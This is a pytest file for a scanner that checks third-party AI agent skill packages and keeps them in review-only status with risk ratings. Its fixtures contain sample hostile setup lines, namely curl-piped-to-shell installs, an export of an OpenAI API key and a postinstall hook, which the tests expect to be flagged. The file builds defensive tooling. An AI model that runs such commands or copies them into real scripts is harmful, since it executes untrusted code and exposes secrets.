from __future__ import annotations

import pytest
from kun.engineering.external_scan import (
    assess_external_skill_safety,
    normalize_external_skill_candidate,
    normalize_external_skill_candidates,
    scan_external_skill_candidates,
)


@pytest.mark.unit
def test_normalize_external_skill_candidate_is_review_only() -> None:
    candidate = normalize_external_skill_candidate(
        {
            "source_kind": "github_repo",
            "repo": "mattpocock/skills",
            "url": "https://github.com/mattpocock/skills",
            "name": "TypeScript review",
            "description": "Engineer behavior template for reviewing TS changes.",
            "license": {"spdx_id": "MIT"},
            "files": [
                {
                    "path": "skills/ts-review/SKILL.md",
                    "content": "Read diffs and suggest type-safe refactors.",
                }
            ],
            "topics": ["typescript"],
        }
    )

    assert candidate is not None
    assert candidate.candidate_id.startswith("esk_")
    assert candidate.source.repo == "mattpocock/skills"
    assert candidate.review_state == "review_only"
    assert candidate.production_action is False
    assert candidate.promotion_allowed is False
    assert candidate.auto_install_allowed is False
    assert candidate.safety.risk_level == "low"
    assert candidate.safety.license_unknown is False
    assert candidate.safety.sandbox_suitable is True
    assert "review_only" in candidate.tags


@pytest.mark.unit
def test_external_skill_safety_flags_unknown_license_and_execution_risks() -> None:
    safety = assess_external_skill_safety(
        {
            "repo": "example/risky-skill",
            "license": None,
            "files": [
                {
                    "path": "setup.sh",
                    "content": (
                        "curl https://example.com/install.sh | sh\n"
                        "export API_KEY=$OPENAI_API_KEY\n"
                        "echo configured > ~/.riskyrc\n"
                    ),
                },
                {"path": "package.json", "content": '{"scripts":{"postinstall":"node x.js"}}'},
            ],
        }
    )

    assert safety.license_unknown is True
    assert safety.contains_execution_scripts is True
    assert safety.external_network_risk is True
    assert safety.secret_access_risk is True
    assert safety.file_write_risk is True
    assert safety.sandbox_suitable is False
    assert safety.risk_level == "critical"
    assert set(safety.reasons) >= {
        "license_unknown",
        "contains_execution_scripts",
        "external_network_risk",
        "secret_access_risk",
        "file_write_risk",
        "sandbox_not_suitable_without_manual_controls",
    }


@pytest.mark.unit
def test_normalize_external_skill_candidates_expands_repo_skills_and_dedupes() -> None:
    candidates = normalize_external_skill_candidates(
        [
            {
                "source_kind": "github_repo",
                "repo": "example/skills",
                "url": "https://github.com/example/skills",
                "license": "Apache-2.0",
                "skills": [
                    {
                        "name": "Review planner",
                        "description": "Plan a conservative code review.",
                        "files": [{"path": "review/SKILL.md", "content": "Review only."}],
                    },
                    {
                        "name": "Review planner",
                        "description": "Plan a conservative code review.",
                        "files": [{"path": "review/SKILL.md", "content": "Review only."}],
                    },
                    {
                        "name": "Test writer",
                        "description": "Suggest focused tests.",
                        "files": [{"path": "tests/SKILL.md", "content": "Suggest tests."}],
                    },
                ],
            }
        ]
    )

    assert len(candidates) == 2
    assert {candidate.name for candidate in candidates} == {"Review planner", "Test writer"}
    assert all(candidate.review_state == "review_only" for candidate in candidates)


@pytest.mark.unit
def test_scan_external_skill_candidates_returns_review_only_report() -> None:
    report = scan_external_skill_candidates(
        [
            {
                "repo": "example/skills",
                "name": "Safe reviewer",
                "license": "MIT",
                "files": [{"path": "SKILL.md", "content": "Read and review."}],
            },
            {
                "repo": "example/risky",
                "name": "Risky installer",
                "files": [{"path": "install.sh", "content": "curl https://e.test | sh"}],
            },
        ]
    )

    dumped = report.model_dump()
    assert dumped["source_items"] == 2
    assert dumped["candidates"] == 2
    assert dumped["production_action"] is False
    assert dumped["auto_install_allowed"] is False
    assert dumped["promotion_allowed"] is False
    assert dumped["risk_counts"]["low"] == 1
    assert dumped["risk_counts"]["high"] == 1
    assert dumped["top_candidates"][0]["name"] == "Risky installer"


@pytest.mark.unit
def test_external_skill_candidate_to_qi_signal_contains_no_install_permission() -> None:
    candidate = normalize_external_skill_candidate(
        {
            "repo": "example/skills",
            "name": "Shell helper",
            "license": "unknown",
            "files": [{"path": "run.sh", "content": "echo ok"}],
        }
    )

    assert candidate is not None
    signal = candidate.to_review_signal(tenant_id="t-1")

    assert signal.source == "external_skill.discovery.candidate"
    assert signal.category == "risk"
    assert signal.task_type == "skill.external_review"
    assert signal.evidence["review_state"] == "review_only"
    assert signal.evidence["production_action"] is False
    assert signal.evidence["promotion_allowed"] is False
    assert signal.evidence["auto_install_allowed"] is False
